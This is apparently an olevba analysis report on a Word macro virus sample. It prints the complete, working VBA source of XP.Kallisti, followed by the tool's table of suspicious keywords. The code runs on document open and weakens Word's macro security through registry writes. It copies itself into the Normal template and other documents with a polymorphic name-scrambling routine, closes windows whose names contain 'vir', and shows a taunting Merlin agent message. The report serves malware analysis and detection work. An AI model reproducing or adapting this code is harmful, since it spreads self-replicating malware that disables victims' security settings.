olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Listi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Listi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
µÊ“©ˆ = µÊ“©ˆ + 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
WordBasic.FileExit dlg
End If
If VBA.GetAttr(Word.Application.ActiveDocument.FullName) = µÊ“©ˆ Then
VBA.SetAttr Word.Application.ActiveDocument.FullName, (Rnd * 0)
ActiveDocument.Reload
End If
VBA.SetAttr Word.Application.NormalTemplate.FullName, (Rnd * 0)
Options.SaveNormalPrompt = vbEmpty
Set Ë³‚¬ˆ = VBA.IIf(Word.Application.MacroContainer = Word.Application.ActiveDocument, Word.Application.NormalTemplate, Word.Application.ActiveDocument)
With Ë³‚¬ˆ.VBProject
With .vbcomponents.Item(µÊ“©ˆ).Codemodule
If Not .lines(90, µÊ“©ˆ) Like "'XP*" Then
.deletelines µÊ“©ˆ, .countoflines
.insertlines µÊ“©ˆ, ©¬–—»(Word.MacroContainer.VBProject.vbcomponents.Item(µÊ“©ˆ).Codemodule.lines(µÊ“©ˆ, 92))
If Ë³‚¬ˆ = Word.Application.ActiveDocument Then Word.Application.ActiveDocument.SaveAs Word.Application.ActiveDocument.FullName, wdFormatDocument
End If
End With
End With
For �—ÈÊŸ = µÊ“©ˆ To Word.Tasks.Count
If VBA.InStr(µÊ“©ˆ, VBA.LCase(Word.Tasks(�—ÈÊŸ).Name), "vir") Then Word.Tasks(�—ÈÊŸ).Close
Next
If VBA.InStr(µÊ“©ˆ, VBA.Time, "5") Then
ˆ¼–„— = "Merlin"
Set •��±Ÿ = CreateObject("Agent.Control.1")
•��±Ÿ.Connected = True
If VBA.IsObject(•��±Ÿ) Then
•��±Ÿ.Characters.Load ˆ¼–„—, ˆ¼–„— & ".acs"
Set Ÿ¶™°� = •��±Ÿ.Characters(ˆ¼–„—)
With Ÿ¶™°�
.Top = 100
.Left = 100
.LanguageID = &H409
.Show
End With
Ÿ¶™°�.Play "Greet"
Ÿ¶™°�.Speak "Hello, " & Word.Application.UserName & "!" & "\Vol=99"
Ÿ¶™°�.Play "GetAttention"
Ÿ¶™°�.Play "GetAttentionReturn"
Ÿ¶™°�.Speak "I said: 'Hello " & Word.Application.UserName & "!" & Chr(39)
Ÿ¶™°�.Play "Idle2_2"
Ÿ¶™°�.Speak "Let me tell you something about a confused girl..."
Ÿ¶™°�.Play "Idle1_1"
Ÿ¶™°�.Speak "...once she turned around and thought,"
Ÿ¶™°�.Play "Idle1_2"
Ÿ¶™°�.Speak "how damn simple it is,"
Ÿ¶™°�.Play "Idle1_1"
Ÿ¶™°�.Speak "leaving a man she once loved,"
Ÿ¶™°�.Play "Idle2_1"
Ÿ¶™°�.Speak "but she did not notice,"
Ÿ¶™°�.Play "Idle1_1"
Ÿ¶™°�.Speak "that her heart had become deaf by the pain..."
Ÿ¶™°�.Play "Acknowledge"
Ÿ¶™°�.Play "Idle1_1"
Ÿ¶™°�.Speak "Oh, I forgot..."
Ÿ¶™°�.Play "Idle2_1"
Ÿ¶™°�.Speak "I think you are infected with XP.Kallisti...(the first virus for Office XP ever)"
Ÿ¶™°�.Play "Idle1_1"
Ÿ¶™°�.Speak "Damn... I have to go now..."
Ÿ¶™°�.MoveTo 800, 600
Ÿ¶™°�.Play "Idle3_1"
Ÿ¶™°�.Play "Wave"
Ÿ¶™°�.Speak "Goodbye now " & Word.Application.UserName & "!"
Set Ž¬‡£Ä = Ÿ¶™°�.Hide
Do Until Ž¬‡£Ä.Status = 0
VBA.DoEvents
Loop
•��±Ÿ.Characters.Unload ˆ¼–„—
End If
End If
End Sub
Private Function ©¬–—»(‚º¾¶„) 'Oh my god, it's poly...xD
µÊ“©ˆ = µÊ“©ˆ + 1
 Á¼�É = "©¬–—» ‚º¾¶„  Á¼�É Â…Èœ¨ º…­¤— ¯±”•¿ ¾­ÊÅ’ µÊ“©ˆ Ë³‚¬ˆ ˆ¼–„— �—ÈÊŸ •��±Ÿ Ÿ¶™°� Ž¬‡£Ä "
Do
¾­ÊÅ’ = VBA.Left( Á¼�É, VBA.InStr( Á¼�É, VBA.Chr(32)) - µÊ“©ˆ):  Á¼�É = VBA.Mid( Á¼�É, VBA.InStr( Á¼�É, VBA.Chr(32)) + µÊ“©ˆ)
º…­¤— = VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129))
Do
¯±”•¿ = VBA.InStr(¯±”•¿ + µÊ“©ˆ, VBA.LCase(‚º¾¶„), VBA.LCase(¾­ÊÅ’))
If ¯±”•¿ Then ‚º¾¶„ = VBA.Mid(‚º¾¶„, µÊ“©ˆ, (¯±”•¿ - µÊ“©ˆ)) & º…­¤— & VBA.Mid(‚º¾¶„, (¯±”•¿ + VBA.Len(¾­ÊÅ’)))
Loop While ¯±”•¿
Loop While  Á¼�É <> ""
©¬–—» = ‚º¾¶„
End Function
'XP.Kallisti
'(c) 2001 jackie // linezer0
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

